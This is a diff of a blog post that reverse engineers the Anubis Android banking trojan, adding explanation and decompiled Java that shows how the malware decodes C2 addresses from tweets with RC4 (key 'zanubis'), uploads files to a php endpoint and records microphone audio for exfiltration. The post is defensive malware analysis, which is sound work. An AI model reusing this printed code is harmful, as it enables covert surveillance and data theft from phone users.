@@ -154,7 +154,9 @@
 
   <div class="post-content"><div>
         <h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<p>Anubis is a pretty big banking trojan that targets android devices. // more stuff</p>
+<p>Anubis is a pretty big banking trojan that targets android devices. Its first appearance dates back to 2016.
+And anubis is reported to have keylogging capabilities, sms spam, GPS tracking and many other scary stuff, of course,
+other than stealing your banking information.</p>
 <p>In this blog post, i will poke various parts of the malware while reverse engineering it to understand how it works and how to defeat it.</p>
 <h1 id="samples">Samples<a href="#samples" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p><a href="https://github.com/sk3ptre/AndroidMalware_2020/blob/master/anubis.zip">github</a></p>
@@ -374,6 +376,7 @@ Output written to anubis-enjarify.jar
 136 classes translated successfully, 0 classes had errors
 rxOred-aspiree :: Analysis/android/anubis » 
 </code></pre><p>Then, using jadx, we can analyse the code.</p>
+<h3 id="mainactivity">MainActivity<a href="#mainactivity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.myvbo */</span>
 <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> Activity <span style="color:#f92672">{</span>
 
@@ -661,6 +664,7 @@ Backtrace =&gt; 0x79f058b9d749 frida-agent-64.so!0x29b749
 });
 </code></pre></div><p>However it does not explicitly specify what are the new values written to the file. Instead, it prints the whole buffer. In this case, the buffer is
 the xml.</p>
+<h3 id="http-c2s-and-endpoints">Http, C2s and Endpoints<a href="#http-c2s-and-endpoints" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Since we have already analyzed few methods from the <code>SomeHttpClass</code>, It&rsquo;s time to dig deep into it.</p>
 <p>class got following member variables.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
@@ -870,7 +874,7 @@ preference. So my assumption on <code>SomeHttpClass.mo226c</code> being a decode
 
 </code></pre></div><p>So what this does is, creates an int array of size 256, fill it with numbers from 0 - 255, loop through 0 - 255 and
 do below expression</p>
-<pre><code>    - i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
+<pre><code>    i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
 </code></pre>
 <p>well this looks like rc4 algorithm. swap function is pretty simple.</p>
 <p>then the array is returned and following method is applied on it by the <code>SomeHttpClass.mo226c</code> method.</p>
@@ -888,15 +892,15 @@ do below expression</p>
     <span style="color:#f92672">}</span>
 </code></pre></div><p>aand this confirms the assumption that this malware uses <strong>rc4 algorithm</strong>. However, unlike many other malware, anubis seems to use a <strong>hardcoded key</strong>, rather than generating a key on the fly, which is <code>zanubis</code>.</p>
 <p>As a summery what <code>MakeTwitterRequest</code> does is,</p>
-<pre><code>    - makes a requests to the url `https://twitter.com/qweqweqwe`, which contains tweets in chinese.
+<pre><code>    - sends a requests to the url `https://twitter.com/qweqweqwe`, which contains tweets in chinese.
     - read the response html in to a buffer and remove all the spaces.
     - save the string in between `苏尔的开始`, `苏尔苏尔完` of the response html in `str`.
     - for each chinese character in `str`, replace it with a corresponding alphanumerical character (which results in a base64 encoded string).
     - decode base64 encoded string in `str` and decrypt it using RC4, with key being equal to `zanubis` 
     - store return value back in `str`.
 </code></pre>
-<p>However we dont really know what malware expects from the reponse html and what is the use of decoded and decrypted data. But i suspect main purpose of this snippet is to extract <strong>C2 server addresses from the tweets of the user</strong>.
-Now we can move onto another interesting methods of the <code>SomeHttpClass</code>.</p>
+<p>However we dont really know what malware expects from the reponse html and what is the use of decoded and decrypted data. But i suspect main purpose of this snippet is to extract <strong>C2 server addresses from the tweets of the user</strong>.</p>
+<p>Now we can move onto another interesting methods of the <code>SomeHttpClass</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo211a</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">,</span> String str3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> 
         String e <span style="color:#f92672">=</span> getSharedPreference<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;websocket&#34;</span><span style="color:#f92672">);</span>
         StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
@@ -910,7 +914,7 @@ Now we can move onto another interesting methods of the <code>SomeHttpClass</cod
 well if we grep that part out from the xml,</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">   &lt;string name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;websocket&#34;</span>&gt;&lt;/string&gt;
 </code></pre></div><p>it&rsquo;s empty. Well my guess is that this will be filled later by the malware.</p>
-<p>then <code>sb</code> is appended with <code>/o1o/a1.php</code>, which looks like a <strong>php endpoint</strong> (if it is, malware might send data to these endpoint), and the resulting string (url) is stored in <code>sb2</code>.</p>
+<p>then <code>sb</code> is appended with <code>/o1o/a1.php</code>, which is a <strong>php endpoint</strong>, and the resulting string (url) is stored in <code>sb2</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>str<span style="color:#f92672">);</span>
         <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> a <span style="color:#f92672">=</span> ReadFile<span style="color:#f92672">(</span>file<span style="color:#f92672">);</span>
         <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>str2<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
@@ -929,7 +933,7 @@ in this case, it reads file specified in <code>str</code> and returns the conten
     <span style="color:#f92672">}</span>
 </code></pre></div><p>So its clear that this function is simply is getting the <strong>SSAID</strong> of the current user/app.
 However, if it is failed to extract this information, it creates a unique ID by adding 35 to the remainders of various IDs when they are divided by 10.</p>
-<p>My assumption is that, malware might be using this information to keep a track on devices.</p>
+<p>My assumption is that, malware might be using this <strong>SSAID to keep a track on devices</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        HttpURLConnection httpURLConnection <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HttpURLConnection<span style="color:#f92672">)</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span>sb2<span style="color:#f92672">).</span><span style="color:#a6e22e">openConnection</span><span style="color:#f92672">();</span>
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setUseCaches</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setDoOutput</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
@@ -938,14 +942,150 @@ However, if it is failed to extract this information, it creates a unique ID by 
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setRequestProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Cache-Control&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;no-cache&#34;</span><span style="color:#f92672">);</span>
         httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">setRequestProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;multipart/form-data;boundary=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*****&#34;</span><span style="color:#f92672">);</span>
 </code></pre></div><p>in the above snippet, method <code>SomeHttpClass.mo211a</code> creates a new HttpURLConnection to the url stored in <code>sb2</code>. then it modifies some attributes of the Http
-Connection. for example, it first sets <code>UseCaches</code> to false, <code>DoOutput</code> to true and <code>RequestMethod</code> to <code>&quot;POST&quot;</code>. It also sets RequestProperties like, <code>&quot;Connection&quot;</code> to <code>&quot;Keep-Alive&quot;</code>, <code>&quot;Cache-Control&quot;</code> to <code>&quot;no-cache&quot;</code> and <code>&quot;Content-Type&quot;</code> to <code>&quot;multipart/form-data;boundary=*****&quot;</code></p>
+Connection. for example, it first sets <code>UseCaches</code> to false, <code>DoOutput</code> to true and <code>RequestMethod</code> to <code>&quot;POST&quot;</code>, and it suggests that the request method this method is going to use is &ldquo;POST&rdquo;. It also sets RequestProperties like, <code>&quot;Connection&quot;</code> to <code>&quot;Keep-Alive&quot;</code>, <code>&quot;Cache-Control&quot;</code> to <code>&quot;no-cache&quot;</code> and <code>&quot;Content-Type&quot;</code> to <code>&quot;multipart/form-data;boundary=*****&quot;</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        DataOutputStream dataOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DataOutputStream<span style="color:#f92672">(</span>httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">());</span>
         dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;--&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*****&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
         StringBuilder sb3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
         sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Content-Disposition: form-data; name=\&#34;serverID\&#34;&#34;</span><span style="color:#f92672">);</span>
         sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span>sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+
 </code></pre></div><p>then it creates a <code>DataOutputStream</code> out from the HttpURLConnection it created before. then it writes following string to the output stream.</p>
 <p><code>--*****\r\n</code></p>
+<p>another StringBuilder is created named <code>sb3</code> and the string</p>
+<pre><code>&quot;Content-Disposition: form-data; name=\&quot;serverID\&quot;&quot;\r\n&quot; 
+</code></pre>
+<p>is appended to it. then <code>sb3</code> is converted into a string and written to the output steam it opened before.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getfiles&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">());</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;--&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*****&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;--&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+</code></pre></div><p>then following strings</p>
+<pre><code>getfiles\r\n
+--*****--\r\n
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        StringBuilder sb4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+        sb4<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;--&#34;</span><span style="color:#f92672">);</span>
+        sb4<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;*****&#34;</span><span style="color:#f92672">);</span>
+        sb4<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span>sb4<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</code></pre></div><p>then again,</p>
+<pre><code>--****\r\n
+</code></pre>
+<p>is written.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Content-Disposition: form-data; name=\&#34;&#34;</span> <span style="color:#f92672">+</span> str3 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;;filename=\&#34;&#34;</span> <span style="color:#f92672">+</span> str2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>a<span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;--&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*****&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;--&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span><span style="color:#f92672">);</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
+        dataOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</code></pre></div><p>here its writing some strings to the output stream again first one being</p>
+<p>&ldquo;Content-Disposition: form-data; name=&quot;&rdquo; + str3 + &ldquo;&quot;;filename=&quot;&rdquo; + str2 + &ldquo;&quot;&rdquo; + &ldquo;\r\n\r\n&rdquo;,</p>
+<p>aaaaand guess what is next? the file it read earlier, which stored in byte array <code>a</code>.
+From that, it can be concluded that this method is doing some data exfiltration work.</p>
+<p>then again, it writes another string to the output stream.</p>
+<pre><code>--*****--\r\n
+</code></pre>
+<p>and then output stream is flushed and closed.</p>
+<p>Well then what are those weird strings and what is the file? well i think those are some kind of markers to indicate end and start of the stream. maybe im wrong. who knows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        BufferedInputStream bufferedInputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedInputStream<span style="color:#f92672">(</span>httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">());</span>
+        BufferedReader bufferedReader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> InputStreamReader<span style="color:#f92672">(</span>bufferedInputStream<span style="color:#f92672">));</span>
+        StringBuilder sb5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+        <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            String readLine <span style="color:#f92672">=</span> bufferedReader<span style="color:#f92672">.</span><span style="color:#a6e22e">readLine</span><span style="color:#f92672">();</span>
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>readLine <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                sb5<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>readLine<span style="color:#f92672">);</span>
+                sb5<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">);</span>
+            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+                bufferedReader<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+                mo213a<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;HTTP&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;HTTPRESPONSE: &#34;</span> <span style="color:#f92672">+</span> sb5<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+                bufferedInputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+                httpURLConnection<span style="color:#f92672">.</span><span style="color:#a6e22e">disconnect</span><span style="color:#f92672">();</span>
+                <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>at the end of the method, we can see it creates an input stream out of the http connection, as well as a buffer reader.
+then a StringBuilder is also declared.</p>
+<p>the loop will continue until the local <code>readline</code> is not equal to null. and if so, it appends StringBuilder with the line that just read.</p>
+<p>else, it closes both BufferedReader and BufferedInputStream and disconnects the HttpURLConnection.</p>
+<p>let&rsquo;s scan the decompiled code to indentify cross references so we can get an idea about which files will be sent to the endpoint. (I renamed the method to <code>SendFileToEndpoint</code> so that it makes more sense :3 )</p>
+<p><img src="/img/anubis/anubis_crossreferences.png" alt="cross references"></p>
+<h3 id="audio-recording">Audio Recording<a href="#audio-recording" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>and if we click one those cross references, we&rsquo;ll end up inside a runnable thread.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo417a</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> Context context<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> String str<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> i<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">final</span> MediaRecorder mediaRecorder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MediaRecorder<span style="color:#f92672">();</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SOUND&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;START RECORD SOUND&#34;</span><span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">f523b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
+        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">setAudioSource</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
+        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">setOutputFormat</span><span style="color:#f92672">(</span>3<span style="color:#f92672">);</span>
+        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">setAudioEncoder</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
+        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">setOutputFile</span><span style="color:#f92672">(</span>str<span style="color:#f92672">);</span>
+</code></pre></div><p>Well this looks scary but yeah. we see a <strong>MediaRecorder</strong> is being initialized. then it starts recording sound and set AudioSource to <strong>AMR_NB</strong>, OutputFormat to <strong>AMR_NB</strong>, AudioEncoder to <strong>AMR_NB</strong> and OutputFile to <code>str</code>, which is the second parameter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        Thread thread <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Thread<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Runnable<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+                SomeHttpClass bVar<span style="color:#f92672">;</span>
+                String str<span style="color:#f92672">;</span>
+                StringBuilder sb<span style="color:#f92672">;</span>
+</code></pre></div><p>this is the runnable thread part i talked above. here it does nothing other than declaring some variables.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                    Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">sleep</span><span style="color:#f92672">((</span><span style="color:#66d9ef">long</span><span style="color:#f92672">)</span> <span style="color:#f92672">(</span>i <span style="color:#f92672">*</span> 1000<span style="color:#f92672">));</span>
+                    AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SOUND&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;STOP RECORD SOUND&#34;</span><span style="color:#f92672">);</span>
+                    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">stop</span><span style="color:#f92672">();</span>
+                        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">release</span><span style="color:#f92672">();</span>
+                        AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">f523b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+                        Log<span style="color:#f92672">.</span><span style="color:#a6e22e">e</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;FILE&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span> str<span style="color:#f92672">);</span>
+                        AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SendFileToEndpoint</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> str<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;sound[]&#34;</span><span style="color:#f92672">);</span>
+                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                        e <span style="color:#f92672">=</span> e<span style="color:#f92672">;</span>
+                        bVar <span style="color:#f92672">=</span> AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+                        str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ERROR&#34;</span><span style="color:#f92672">;</span>
+                        sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+                        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Record Sound! &#34;</span><span style="color:#f92672">);</span>
+                        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+                        bVar<span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span>str<span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+                    <span style="color:#f92672">}</span>
+</code></pre></div><p>inside the try block, we can it calls Thread.sleep for i * 1000, where <code>i</code> is the third parameter.
+we see another call <code>SomeHttpClass.mo213a</code> but this time with <code>&quot;STOP RECORD SOUND&quot;</code> as the second argument (compared to the previous call&rsquo;s second argument being &ldquo;START RECORD SOUND&rdquo;). So it looks like the function starts recording audio, sleep for user (in this case programmer) specified time and stop recording.</p>
+<p>then there&rsquo;s try block inside the try block, which basically stops the mediaRecorder and release it. then it sets some boolean variable to true, i guess which is responsible to tracking if it is still recording audio or not (and im gonna rename it to something that makes more sense).</p>
+<p>then we see what we ve been expecting to see, the cross references. it passes <code>str</code> as the second argument (filename) and an empty string and <code>sound[]</code> as third and fouth arguments.</p>
+<p>inside the catch block, it just creates a string containing the error and pass it to <code>SomeHttpClass.mo213a</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InterruptedException unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SOUND&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;STOP RECORD SOUND&#34;</span><span style="color:#f92672">);</span>
+                    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">stop</span><span style="color:#f92672">();</span>
+                        mediaRecorder<span style="color:#f92672">.</span><span style="color:#a6e22e">release</span><span style="color:#f92672">();</span>
+                        AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">f523b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+                        Log<span style="color:#f92672">.</span><span style="color:#a6e22e">e</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;FILE&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span> str<span style="color:#f92672">);</span>
+                        AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SendFileToEndpoint</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> str<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;sound[]&#34;</span><span style="color:#f92672">);</span>
+                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                        e <span style="color:#f92672">=</span> e2<span style="color:#f92672">;</span>
+                        bVar <span style="color:#f92672">=</span> AudioRecord<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+                        str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ERROR&#34;</span><span style="color:#f92672">;</span>
